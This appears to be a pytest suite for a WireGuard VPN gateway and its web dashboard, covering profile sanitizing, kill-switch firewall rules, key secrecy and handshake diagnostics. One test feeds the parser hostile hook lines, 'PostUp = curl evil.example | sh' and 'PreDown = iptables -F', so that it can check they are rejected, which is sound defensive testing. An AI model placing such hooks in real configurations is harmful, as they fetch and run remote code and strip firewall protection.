"""Offline WireGuard parser and API safeguards. No network, keys or Docker needed."""
import base64
import json

import pytest
import vpn_gateway as gateway
import vpn_ui


KEY_A = base64.b64encode(bytes([1]) * 32).decode()
KEY_B = base64.b64encode(bytes([2]) * 32).decode()
PROFILE = (
    "[Interface]\n"
    f"PrivateKey = {KEY_A}\n"
    "Address = 10.14.0.2/16\n"
    "DNS = 162.252.172.57\n"
    "[Peer]\n"
    f"PublicKey = {KEY_B}\n"
    "AllowedIPs = 0.0.0.0/0\n"
    "Endpoint = 203.0.113.11:51820\n"
)


def test_valid_surfshark_style_conf_is_sanitized():
    result = gateway.parse_profile(PROFILE)
    assert result["endpoint"] == "203.0.113.11"
    assert "Address = 10.14.0.2/16" in result["text"]
    assert "DNS =" not in result["text"]
    assert "PrivateKey =" in result["text"]
    assert "AllowedIPs = 0.0.0.0/0" in result["text"]


@pytest.mark.parametrize("replacement", [
    "PostUp = curl evil.example | sh",
    "PreDown = iptables -F",
    "SaveConfig = true",
    "Table = off",
])
def test_reject_hooks_and_route_bypass(replacement):
    content = PROFILE.replace("DNS = 162.252.172.57", replacement)
    with pytest.raises(ValueError):
        gateway.parse_profile(content)


def test_reject_split_tunnel_and_invalid_key():
    with pytest.raises(ValueError, match="Full-tunnel"):
        gateway.parse_profile(PROFILE.replace("0.0.0.0/0", "10.0.0.0/8"))
    with pytest.raises(ValueError, match="key"):
        gateway.parse_profile(PROFILE.replace(KEY_A, "not-a-key"))


def test_rotation_loop_records_each_verified_country_and_restores(monkeypatch, tmp_path):
    monkeypatch.setattr(gateway, "ROOT", tmp_path)
    monkeypatch.setattr(gateway, "ACTIVE_FILE", tmp_path / "wg0.conf")
    monkeypatch.setattr(gateway, "META_FILE", tmp_path / "profiles.json")
    gateway.TASK.update(running=True, done=False, results=[], message="")
    gateway.save_metadata({"profiles": [
        {"id": "a", "filename": "nl.conf", "country": "Netherlands"},
        {"id": "b", "filename": "de.conf", "country": "Germany"},
    ], "active": "a"})
    called = []

    def fake_activate(pid):
        called.append(pid)
        return {"ip": "198.51.100.10" if pid == "a" else "198.51.100.20",
                "country": "Netherlands" if pid == "a" else "Germany",
                "country_code": "NL" if pid == "a" else "DE"}
    monkeypatch.setattr(gateway, "_activate", fake_activate)
    gateway.test_worker()
    assert called == ["a", "b", "a"]
    assert gateway.TASK["done"] and not gateway.TASK["running"]
    assert len(gateway.TASK["results"]) == 2
    assert all(item["ok"] for item in gateway.TASK["results"])


def test_controller_disabled_has_no_side_effects(monkeypatch):
    monkeypatch.delenv("VPN_GATEWAY_ENABLED", raising=False)
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        assert client.get("/api/vpn/profiles").status_code == 503


def test_controller_needs_no_user_token_but_rejects_cross_origin_actions(monkeypatch, tmp_path):
    monkeypatch.setenv("VPN_GATEWAY_ENABLED", "1")
    token = tmp_path / "control-token"
    token.write_text("secret-controlled-by-gateway-and-server-only-012345")
    monkeypatch.setenv("VPN_CONTROL_TOKEN_FILE", str(token))
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        # The browser needs no administrator credentials. GET may return 503
        # when the actual gateway isn't running in the offline test.
        assert client.get("/api/vpn/profiles").status_code != 403
        assert client.post("/api/vpn/test").status_code == 403
        assert client.post("/api/vpn/test", headers={
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://other.example",
        }).status_code == 403
        assert client.post("/api/vpn/test", headers={
            "X-Requested-With": "XMLHttpRequest",
        }).status_code != 403


def test_gateway_control_token_is_generated_once_without_admin_setup(monkeypatch, tmp_path):
    import os
    monkeypatch.setenv("VPN_DOWNLOADER_UID", str(os.getuid()))
    monkeypatch.setenv("VPN_DOWNLOADER_GID", str(os.getgid()))
    location = tmp_path / "state" / ".vpn-control-token"
    monkeypatch.setattr(gateway, "TOKEN_FILE", location)
    gateway.ensure_control_token()
    first = location.read_text().strip()
    assert len(first) >= 32
    assert gateway.TOKEN == first
    assert location.stat().st_mode & 0o777 == 0o600
    gateway.ensure_control_token()
    assert location.read_text().strip() == first


def test_normal_compose_provides_gateway_without_env_or_overrides():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    compose = (root / "compose.yaml").read_text()
    assert "wireguard-gateway:" in compose
    assert 'network_mode: "service:wireguard-gateway"' in compose
    assert 'VPN_GATEWAY_ENABLED: "1"' in compose
    assert "SURFSHARK_CONTROL_API_KEY" not in compose
    assert "compose.wireguard.yaml" not in compose
    html = (root / "templates/index.html").read_text()
    assert "vpn-admin-key" not in html
    assert "vpn-country" not in html
    assert 'id="vpn-upload-input"' in html
    assert 'id="vpn-test-button"' in html


def test_shared_parent_compose_override_and_safe_installer():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    overlay = (root / "compose.parent-vpn.yaml").read_text()
    script = (root / "scripts/enable-vpn-ui.sh").read_text()
    assert "wireguard-gateway:" in overlay
    assert 'network_mode: "service:wireguard-gateway"' in overlay
    assert "ports: !reset []" in overlay
    assert "SURFSHARK_CONTROL_API_KEY" not in overlay
    assert 'VPN_GATEWAY_ENABLED: "1"' in overlay
    assert "docker-compose.override.yml" in script
    assert "ps -q yt-dlp-server" in script
    assert "api/jobs" in script
    assert "active_resolution_tracks" in script
    assert "docker compose" in script
    assert "stop yt-dlp-server" in script
    assert "up -d --build --force-recreate wireguard-gateway yt-dlp-server" in script
    assert "will not be overwritten" in script


def test_surfshark_template_requires_registered_client_private_key():
    from vpn_ui import MissingClientKey, complete_wireguard_template

    missing = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    with pytest.raises(MissingClientKey, match="Surfshark"):
        complete_wireguard_template(missing)
    result = complete_wireguard_template(missing, KEY_A)
    assert "PrivateKey = " + KEY_A in result
    assert "<insert_your_private_key_here>" not in result
    assert gateway.parse_profile(result)["endpoint"] == "203.0.113.11"


def test_invalid_shared_key_error_does_not_echo_secret():
    from vpn_ui import complete_wireguard_template
    missing = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    fake_key = "NOT-AN-ACTUAL-WIREGUARD-PRIVATE-KEY"
    with pytest.raises(ValueError) as exc:
        complete_wireguard_template(missing, fake_key)
    assert fake_key not in str(exc.value)
    # Already-complete profiles are unchanged and must never be overwritten.
    assert complete_wireguard_template(PROFILE, KEY_B) == PROFILE


def test_five_template_uploads_need_only_one_shared_key(monkeypatch):
    import io
    from flask import Flask
    from threading import Lock

    monkeypatch.setenv("VPN_GATEWAY_ENABLED", "1")
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    calls = []

    def fake_gateway(path, payload=None):
        calls.append((path, payload))
        if path == "/profiles" and payload is not None:
            assert "PrivateKey = " + KEY_A in payload["content"]
            assert "<insert_your_private_key_here>" not in payload["content"]
            return {"id": str(len(calls)).zfill(32), "filename": payload["filename"],
                    "country": payload["country"]}, 200
        if path == "/profiles":
            return {"profiles": [], "active": "an-existing-profile"}, 200
        raise AssertionError("Unexpected VPN gateway call")

    monkeypatch.setattr(vpn_ui, "gateway_call", fake_gateway)
    templates = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    names = ("us-nyc.conf", "nl-ams.conf", "de-fra.conf",
             "pt-lis.conf", "uk-lon.conf")

    def upload(client, supplied_key=None):
        files = [(io.BytesIO(templates.encode()), name) for name in names]
        data = {"configs": files}
        if supplied_key is not None:
            data["private_key"] = supplied_key
        return client.post("/api/vpn/profiles", data=data,
                           headers={"X-Requested-With": "XMLHttpRequest"},
                           content_type="multipart/form-data")

    with app.test_client() as client:
        no_key = upload(client)
        assert no_key.status_code == 422
        assert no_key.json["needs_private_key"] is True
        assert calls == []   # preflight refuses all five, no partial import

        with_key = upload(client, KEY_A)
        assert with_key.status_code == 200
        assert len(with_key.json["uploaded"]) == 5
        assert len(calls) == 6  # 5 uploads + status check
        assert KEY_A not in with_key.get_data(as_text=True)


def test_gateway_explains_missing_private_key_instead_of_generic_error():
    template = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    with pytest.raises(ValueError, match="template"):
        gateway.parse_profile(template)


def test_startup_failure_reports_phase_without_command_stderr_or_keys():
    import vpn_gateway as g
    sample = "wg-quick: command failed; PrivateKey = SIMULATED-SECRET-KEY"
    failure = g.setup_error(sample)
    assert failure.phase == "tunnel_setup"
    assert "SIMULATED-SECRET-KEY" not in str(failure)
    assert g.setup_error("RTNETLINK answers: Operation not permitted").phase == "permissions"
    assert g.setup_error("RTNETLINK answers: Operation not supported").phase == "kernel"
    assert g.setup_error("RTNETLINK answers: File exists").phase == "routing"


def test_handshake_timeout_reports_peer_stage_without_dns_or_http(monkeypatch):
    import vpn_gateway as g
    import socket
    from types import SimpleNamespace

    monkeypatch.setattr(g, "has_handshake", lambda: False)
    monkeypatch.setattr(g.socket, "create_connection",
                        lambda *args, **kwargs: (_ for _ in ()).throw(
                            socket.timeout("dummy")))
    now = iter((0, 0, 1, 9))
    monkeypatch.setattr(g.time, "monotonic", lambda: next(now))
    monkeypatch.setattr(g.time, "sleep", lambda _: None)
    with pytest.raises(g.VPNConnectionError, match="handshake") as exc:
        g.wait_for_handshake(seconds=3)
    assert exc.value.phase == "handshake"


def test_dns_failure_has_own_stage(monkeypatch):
    import vpn_gateway as g
    import socket
    monkeypatch.setattr(g.socket, "getaddrinfo",
                        lambda *args, **kwargs: (_ for _ in ()).throw(
                            socket.gaierror(-3, "temporary failure")))
    with pytest.raises(g.VPNConnectionError) as exc:
        g.check_dns()
    assert exc.value.phase == "dns"


def test_failed_activation_preserves_specific_phase_and_blocks_direct_egress(
    monkeypatch, tmp_path
):
    import vpn_gateway as g
    from types import SimpleNamespace

    monkeypatch.setattr(g, "ROOT", tmp_path)
    monkeypatch.setattr(g, "ACTIVE_FILE", tmp_path / "wg0.conf")
    monkeypatch.setattr(g, "META_FILE", tmp_path / "profiles.json")
    monkeypatch.setattr(g, "FIREWALL_ENABLED", False)
    g.save_metadata({"profiles": [{"id": "a", "filename": "us-nyc.conf",
                                   "country": "us-nyc"}], "active": None})
    (tmp_path / "a.conf").write_text(PROFILE)
    monkeypatch.setattr(g, "parse_profile", lambda content: {
        "endpoint": "203.0.113.11", "port": 51820, "text": content})
    monkeypatch.setattr(g, "firewall",
                        lambda: monkeypatch.setattr(g, "FIREWALL_ENABLED", True))
    monkeypatch.setattr(g, "stop_tunnel", lambda: None)
    monkeypatch.setattr(g, "allow_endpoint", lambda *a: None)
    monkeypatch.setattr(g, "run", lambda *args, **kwargs:
                        SimpleNamespace(returncode=0, stderr="", stdout=""))
    monkeypatch.setattr(g, "wait_for_handshake",
                        lambda *args, **kwargs: (_ for _ in ()).throw(
                            g.VPNConnectionError("handshake", "No WireGuard peer response")))
    with pytest.raises(g.VPNConnectionError) as exc:
        g._activate("a")
    assert exc.value.phase == "handshake"
    assert g.metadata()["active"] is None
    monkeypatch.setattr(g, "has_handshake", lambda: False)
    state = g.list_profiles()
    assert state["kill_switch"] is True
    assert state["tunnel_ready"] is False


def test_exit_ip_backup_api(monkeypatch):
    import io
    import vpn_gateway as g

    class Response:
        headers = {"Content-Length": "0"}
        def __enter__(self): return self
        def __exit__(self, *args): return False
        def read(self, limit): return (
            b'{"ip":"198.51.100.7","country_name":"Portugal","country_code":"PT"}'
        )

    calls = []
    def fetch(req, **kwargs):
        calls.append(req.full_url)
        if len(calls) == 1:
            raise OSError("primary is unavailable")
        return Response()
    monkeypatch.setattr(g, "urlopen", fetch)
    result = g.probe()
    assert result["country_code"] == "PT"
    assert result["ip"] == "198.51.100.7"
    assert len(calls) == 2


def test_ui_distinguishes_killswitch_from_direct_connection():
    from pathlib import Path
    js = (Path(__file__).parents[1] / "static/vpn-manager.js").read_text()
    assert "VPN NOT CONNECTED · DOWNLOADS BLOCKED" in js
    assert 'data.kill_switch && !ready' in js
    assert "entry.phase" in js


def test_gateway_compose_preconfigures_full_tunnel_sysctl():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    for filename in ("compose.yaml", "compose.parent-vpn.yaml"):
        source = (root / filename).read_text()
        assert 'net.ipv4.conf.all.src_valid_mark: "1"' in source
    image = (root / "Dockerfile.vpn-gateway").read_text()
    assert "wg-quick" in image
    assert "sysctl -n net.ipv4.conf.all.src_valid_mark" in image
    assert "cmd sysctl -q net.ipv4.conf.all.src_valid_mark=1" in image


def test_handshake_diagnostics_counts_only_permitted_udp_without_secret():
    from types import SimpleNamespace
    import vpn_gateway as g

    sample = """Chain VPN_ENDPOINT (1 references)
 pkts bytes target prot opt in out source destination
   10 1480 ACCEPT udp -- * * 0.0.0.0/0 203.0.113.5 udp dpt:51820
"""
    original = g.run
    try:
        g.run = lambda *args, **kwargs: SimpleNamespace(
            returncode=0, stdout=sample, stderr="")
        assert g.endpoint_udp_packets(51820) == 10
        assert g.endpoint_udp_packets(52000) is None
    finally:
        g.run = original


def test_client_public_key_derivation_never_exposes_private_secret(monkeypatch):
    from types import SimpleNamespace
    import vpn_gateway as g

    calls = []
    def fake_run(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return SimpleNamespace(
            returncode=0,
            stdout="".join(["A" * 43, "=\n"]),
            stderr="")
    monkeypatch.setattr(g.subprocess, "run", fake_run)
    pub = g.client_public_key(PROFILE)
    assert pub == "A" * 43 + "="
    assert calls[0][0] == ["wg", "pubkey"]
    assert calls[0][1]["input"].strip() == KEY_A
    assert KEY_A not in pub


def test_handshake_failure_includes_safe_diagnostics_before_rollback(
    monkeypatch, tmp_path
):
    from types import SimpleNamespace
    import vpn_gateway as g

    monkeypatch.setattr(g, "ROOT", tmp_path)
    monkeypatch.setattr(g, "ACTIVE_FILE", tmp_path / "wg0.conf")
    monkeypatch.setattr(g, "META_FILE", tmp_path / "profiles.json")
    monkeypatch.setattr(g, "FIREWALL_ENABLED", True)
    g.save_metadata({"profiles": [{"id": "a", "filename": "us-nyc.conf",
                                   "country": "us-nyc"}], "active": None})
    (tmp_path / "a.conf").write_text(PROFILE)
    monkeypatch.setattr(g, "parse_profile", lambda config: {
        "endpoint": "203.0.113.5", "port": 51820, "text": config})
    monkeypatch.setattr(g, "stop_tunnel", lambda: None)
    monkeypatch.setattr(g, "allow_endpoint", lambda *a: None)
    monkeypatch.setattr(g, "run", lambda *args, **kwargs:
                        SimpleNamespace(returncode=0, stderr="", stdout=""))
    monkeypatch.setattr(g, "wait_for_handshake",
                        lambda: (_ for _ in ()).throw(
                            g.VPNConnectionError("handshake", "Peer did not respond")))
    monkeypatch.setattr(g, "endpoint_udp_packets", lambda port: 3)
    monkeypatch.setattr(g, "client_public_key", lambda config: "A" * 43 + "=")

    with pytest.raises(g.VPNConnectionError) as exc:
        g._activate("a")
    assert exc.value.phase == "handshake"
    assert exc.value.diagnostics["udp_packets_allowed"] == 3
    assert exc.value.diagnostics["port"] == 51820
    assert exc.value.diagnostics["client_public_key"] == "A" * 43 + "="
    assert KEY_A not in str(exc.value.diagnostics)


def test_browser_shows_egress_counter_and_registered_client_public_key():
    from pathlib import Path
    script = (Path(__file__).parents[1] / "static/vpn-manager.js").read_text()
    assert "udp_packets_allowed" in script
    assert "CLIENT PUBLIC KEY" in script
    assert "entry.diagnostics" in script


def test_wireguard_transfer_reports_only_numeric_counters(monkeypatch):
    import vpn_gateway as g
    from types import SimpleNamespace
    peer = "A" * 43 + "="
    def run(*args, **kwargs):
        assert args == ("wg", "show", "wg0", "transfer")
        return SimpleNamespace(returncode=0, stdout=f"{peer}\t20\t148\n",
                               stderr="")
    monkeypatch.setattr(g, "run", run)
    assert g.wireguard_transfer() == {"rx_bytes": 20, "tx_bytes": 148}


def test_wireguard_transfer_unavailable_without_usable_data(monkeypatch):
    import vpn_gateway as g
    from types import SimpleNamespace
    monkeypatch.setattr(g, "run",
                        lambda *args, **kwargs:
                        SimpleNamespace(returncode=1, stdout="", stderr=""))
    assert g.wireguard_transfer() is None


def test_endpoint_route_uses_wireguard_socket_mark_to_check_underlay(monkeypatch):
    import vpn_gateway as g
    from types import SimpleNamespace

    calls = []
    def command(*args, **kwargs):
        calls.append(args)
        if args[:4] == ("wg", "show", "wg0", "fwmark"):
            return SimpleNamespace(returncode=0, stdout="0xca6c\n", stderr="")
        return SimpleNamespace(returncode=0,
                               stdout="146.70.186.149 via 172.18.0.1 dev eth0 src 172.18.0.2 mark 0xca6c\n",
                               stderr="")
    monkeypatch.setattr(g, "run", command)
    assert g.endpoint_route("146.70.186.149") == "underlay"
    assert calls[-1] == ("ip", "-4", "route", "get",
                         "146.70.186.149", "mark", "0xca6c")


def test_endpoint_route_detects_own_tunnel_loop(monkeypatch):
    import vpn_gateway as g
    from types import SimpleNamespace

    def command(*args, **kwargs):
        if args[0] == "wg":
            return SimpleNamespace(returncode=0, stdout="0xca6c", stderr="")
        return SimpleNamespace(returncode=0,
                               stdout="146.70.186.149 dev wg0 src 10.14.0.2", stderr="")
    monkeypatch.setattr(g, "run", command)
    assert g.endpoint_route("146.70.186.149") == "tunnel"


def test_handshake_diagnostics_include_transfer_and_route_without_secrets(monkeypatch):
    import vpn_gateway as g
    monkeypatch.setattr(g, "wireguard_transfer",
                        lambda: {"rx_bytes": 0, "tx_bytes": 148})
    monkeypatch.setattr(g, "endpoint_udp_packets", lambda _: None)
    monkeypatch.setattr(g, "endpoint_route", lambda _: "underlay")
    monkeypatch.setattr(g, "client_public_key", lambda _: "A" * 43 + "=")
    diagnostics = g.safe_handshake_diagnostics({
        "endpoint": "146.70.186.149", "port": 51820, "text": PROFILE})
    assert diagnostics["wireguard_tx_bytes"] == 148
    assert diagnostics["wireguard_rx_bytes"] == 0
    assert diagnostics["udp_packets_allowed"] is None
    assert diagnostics["endpoint_route"] == "underlay"
    assert KEY_A not in str(diagnostics)


def test_web_dashboard_survives_fail_closed_firewall(monkeypatch):
    """Port 4545 responses remain accessible without unblocking downloads.

    This checks both Docker's IPv4/IPv6 port publication and the routing
    policy used when wg-quick enables a full-tunnel default route.
    """
    import vpn_gateway as g

    from types import SimpleNamespace
    calls = []
    def fake_run(*args, **kwargs):
        calls.append(args)
        return SimpleNamespace(returncode=0)
    monkeypatch.setattr(g, "run", fake_run)
    monkeypatch.setattr(g, "FIREWALL_ENABLED", False)
    g.firewall()

    assert g.FIREWALL_ENABLED is True
    # Fail closed for all outbound traffic, including IPv6.
    assert ("iptables", "-P", "OUTPUT", "DROP") in calls
    assert ("ip6tables", "-P", "OUTPUT", "DROP") in calls
    # Only the published web listener can respond directly (IPv4 or IPv6).
    assert ("iptables", "-A", "OUTPUT", "-p", "tcp",
            "--sport", "4545", "-j", "ACCEPT") in calls
    assert ("ip6tables", "-A", "OUTPUT", "-p", "tcp",
            "--sport", "4545", "-j", "ACCEPT") in calls
    # Web replies are marked with the SAME fwmark as WireGuard's socket,
    # bypassing wg-quick's earlier "not fwmark" VPN routing rule.
    assert ("iptables", "-t", "mangle", "-C", "OUTPUT", "-p", "tcp",
            "--sport", "4545", "-j", "MARK", "--set-mark", "51820") in calls
    assert not any(args[:4] == ("ip", "-4", "rule", "add")
                   for args in calls)
    # No general non-VPN outbound bypass is introduced.
    assert ("iptables", "-A", "OUTPUT", "-j", "ACCEPT") not in calls
    assert ("ip6tables", "-A", "OUTPUT", "-j", "ACCEPT") not in calls
    assert all(
        not ("-j" in args and args[args.index("-j") + 1] == "ACCEPT"
             and "--sport" not in args
             and "-o" not in args
             and "-d" not in args)
        for args in calls if args[0] in {"iptables", "ip6tables"}
    )


def test_web_mangle_rule_inserted_once_and_kept_after_vpn_start(monkeypatch):
    """Firewall must mark dashboard replies, no reliance on fragile ip-rule prefs."""
    import vpn_gateway as g
    from types import SimpleNamespace

    commands = []
    def fake(*argv, check=True):
        commands.append(argv)
        if "-C" in argv:
            return SimpleNamespace(returncode=1)
        return SimpleNamespace(returncode=0)
    monkeypatch.setattr(g, "run", fake)
    monkeypatch.setattr(g, "FIREWALL_ENABLED", False)

    g.firewall()
    assert ("iptables", "-t", "mangle", "-I", "OUTPUT", "1",
            "-p", "tcp", "--sport", "4545",
            "-j", "MARK", "--set-mark", "51820") in commands
    assert ("iptables", "-P", "OUTPUT", "DROP") in commands
    assert ("iptables", "-A", "OUTPUT", "-p", "tcp",
            "--sport", "4545", "-j", "ACCEPT") in commands
    assert not any(args[:4] == ("ip", "-4", "rule", "add")
                   for args in commands)


def test_web_mangle_rule_is_idempotent(monkeypatch):
    import vpn_gateway as g
    from types import SimpleNamespace
    commands = []
    def fake(*argv, check=True):
        commands.append(argv)
        return SimpleNamespace(returncode=0)
    monkeypatch.setattr(g, "run", fake)
    g.firewall()
    assert any(args[:4] == ("iptables", "-t", "mangle", "-C")
               for args in commands)
    assert not any(args[:4] == ("iptables", "-t", "mangle", "-I")
                   for args in commands)


def test_sanitized_profile_uses_fixed_route_mark_on_every_parse():
    import vpn_gateway as g
    first = g.parse_profile(PROFILE)
    assert first["text"].count("FwMark = 51820") == 1
    second = g.parse_profile(first["text"])
    assert second["text"] == first["text"]
    with pytest.raises(ValueError, match="FwMark"):
        g.parse_profile(PROFILE.replace(
            "Address = 10.14.0.2/16",
            "Address = 10.14.0.2/16\nFwMark = 123"))


def test_existing_profiles_expose_only_derived_client_public_keys(monkeypatch, tmp_path):
    import uuid
    import vpn_gateway as g

    profile_id = uuid.uuid4().hex
    monkeypatch.setattr(g, "ROOT", tmp_path)
    monkeypatch.setattr(g, "META_FILE", tmp_path / "profiles.json")
    monkeypatch.setattr(g, "PROFILE_PUBLIC_CACHE", {})
    g.save_metadata({"profiles": [
        {"id": profile_id, "filename": "nl-ams.conf", "country": "nl-ams"}
    ], "active": None})
    (tmp_path / (profile_id + ".conf")).write_text(PROFILE)
    calls = []

    def derive(text):
        calls.append(text)
        return "A" * 43 + "="
    monkeypatch.setattr(g, "client_public_key", derive)
    monkeypatch.setattr(g, "FIREWALL_ENABLED", False)

    first = g.list_profiles()["profiles"]
    second = g.list_profiles()["profiles"]
    assert first[0]["client_public_key"] == "A" * 43 + "="
    assert second[0]["client_public_key"] == first[0]["client_public_key"]
    assert len(calls) == 1  # cache only PUBLIC derived key
    assert KEY_A not in str(g.list_profiles())
    assert "PrivateKey" not in str(first)
    assert "PublicKey = " + KEY_B not in str(first)


def test_profile_client_public_key_missing_and_cache_invalidation(monkeypatch, tmp_path):
    import uuid
    import vpn_gateway as g

    profile_id = uuid.uuid4().hex
    monkeypatch.setattr(g, "ROOT", tmp_path)
    monkeypatch.setattr(g, "PROFILE_PUBLIC_CACHE", {})
    assert g.stored_client_public_key(profile_id) is None
    file = tmp_path / (profile_id + ".conf")
    file.write_text(PROFILE)
    calls = []
    monkeypatch.setattr(g, "client_public_key",
                        lambda text: calls.append(text) or "B" * 43 + "=")
    assert g.stored_client_public_key(profile_id) == "B" * 43 + "="
    assert g.stored_client_public_key(profile_id) == "B" * 43 + "="
    assert len(calls) == 1
    file.write_text(PROFILE + "# changed stored profile\n")
    assert g.stored_client_public_key(profile_id) == "B" * 43 + "="
    assert len(calls) == 2
    file.unlink()
    assert g.stored_client_public_key(profile_id) is None
    assert g.stored_client_public_key("../unsafe") is None


def test_vpn_dashboard_has_public_key_view_without_private_key_controls():
    from pathlib import Path
    root = Path(__file__).parents[1]
    html = (root / "templates/index.html").read_text()
    js = (root / "static/vpn-manager.js").read_text()
    assert 'id="vpn-public-keys"' in html
    assert "showPublicKeys(profiles)" in js
    assert "Client public key" in js
    assert "item.client_public_key" in js
    assert "different client keys" in js.lower()
    assert "PrivateKey =" not in js
